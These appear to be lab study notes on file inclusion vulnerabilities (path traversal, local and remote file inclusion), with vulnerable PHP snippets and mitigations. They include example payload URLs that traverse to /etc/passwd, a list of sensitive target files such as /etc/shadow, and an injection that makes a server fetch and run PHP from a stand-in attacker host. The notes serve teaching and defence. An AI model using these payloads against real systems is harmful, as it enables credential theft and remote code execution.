# **File Inclusion Vulnerabilities**

## Overview  
- **Objective**: Understand and exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.  
- **Content**: The room provides practical examples, hands-on challenges, and discusses the risks and remediation of these vulnerabilities.

## How File Inclusion Works  
- **File Access**: Web applications often request access to files using parameters in the URL. For example:

**# Path Traversal (Directory Traversal) Summary**

Path traversal is a web security vulnerability that allows attackers to access sensitive files and directories on a server by manipulating the application's URL. By exploiting this vulnerability, attackers can read files outside the application's root directory, such as operating system resources.

## Key Points:

- **Mechanism**: The vulnerability occurs when user input is passed to file-handling functions (e.g., `file_get_contents` in PHP) without proper validation. Attackers can use payloads like `../` (dot-dot-slash) to traverse directories.

- **Example Attack**:  
  - A typical attack URL: `http://webapp.thm/get.php?file=../../../../etc/passwd`  
  - This example attempts to access the `/etc/passwd` file by moving up the directory structure.

- **Windows Systems**: The same concept applies to Windows servers, where attackers can exploit paths like `C:boot.ini` using similar traversal techniques.

- **Common Target Files**:  
  - `/etc/passwd`: User account information.  
  - `/etc/shadow`: Password information.  
  - `/var/log/apache2/access.log`: Access logs for the web server.  
  - `C:boot.ini`: Boot options for BIOS firmware.

## Prevention:  
To mitigate path traversal vulnerabilities, developers should implement strict input validation and filtering to ensure users cannot manipulate file paths.

**Local File Inclusion**

**Local File Inclusion (LFI)** vulnerabilities occur when web applications include files based on user-controlled input without proper validation. This can allow attackers to include arbitrary files on the server, potentially leading to sensitive information disclosure or code execution.

**Common Causes:**

* Using functions like `include`, `require`, `include_once`, and `require_once` without proper input validation.  
* Lack of security awareness among developers.

**Exploitation Scenarios:**

1. **Direct Inclusion:**  
   * **Example:** `include($_GET["lang"]);`  
   * **Exploit:** `http://webapp.thm/index.php?lang=/etc/passwd`  
   * **Vulnerability:** No directory specified, and no input validation.  
2. **Directory-Based Inclusion:**  
   * **Example:** `include("languages/". $_GET['lang']);`  
   * **Exploit:** `http://webapp.thm/index.php?lang=../../../../etc/passwd`  
   * **Vulnerability:** Directory specified, but no input validation, allowing path traversal.

**Key Points:**

* LFI vulnerabilities are often caused by developer oversight.  
* Path traversal techniques are often used to exploit LFI.  
* Input validation is crucial to prevent LFI attacks.

**Additional Considerations:**

* **File Types:** The type of file included can affect the impact of the attack. For example, including a PHP file could lead to code execution.  
* **Server Configuration:** Server configuration can influence the severity of LFI vulnerabilities.  
* **Mitigation:** Proper input validation, whitelisting allowed file paths, and using relative paths can help mitigate LFI risks.

# **Remote File Inclusion**

**Remote File Inclusion (RFI)** vulnerabilities occur when web applications include files from external sources based on user-controlled input without proper validation. This can allow attackers to include malicious files hosted on external servers, potentially leading to severe consequences like Remote Command Execution (RCE).

## **Prerequisites:**

* **allow_url_fopen:** This PHP setting must be enabled for RFI to be possible.

## **Potential Consequences:**

* **Remote Command Execution (RCE):** An attacker can execute arbitrary code on the vulnerable server.  
* **Sensitive Information Disclosure:** Access to sensitive files or data.  
* **Cross-site Scripting (XSS):** Injecting malicious JavaScript into the web application.  
* **Denial of Service (DoS):** Overloading the server with requests.

## **Exploitation Process:**

1. **Host Malicious File:** The attacker hosts a malicious file on their server.  
2. **Inject Malicious URL:** The attacker injects the URL of the malicious file into the vulnerable application's input.  
3. **Server-Side Request:** The vulnerable application's server sends a request to the attacker's server to fetch the file.  
4. **File Inclusion:** The vulnerable application includes the remote file, executing its content.

## **Example:**

* **Malicious File:** `http://attacker.thm/cmd.txt` (containing PHP code)  
* **Injection:** `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`  
* **Result:** The PHP code from the malicious file is executed on the vulnerable server.

## **Mitigation:**

* **Disable allow_url_fopen:** If not necessary, disable this setting to prevent RFI.  
* **Input Validation:** Strictly validate user-controlled input to prevent malicious URLs from being included.  
* **Use Relative Paths:** Avoid using absolute paths in include functions.  
* **Restrict File Inclusion:** Limit the types of files that can be included.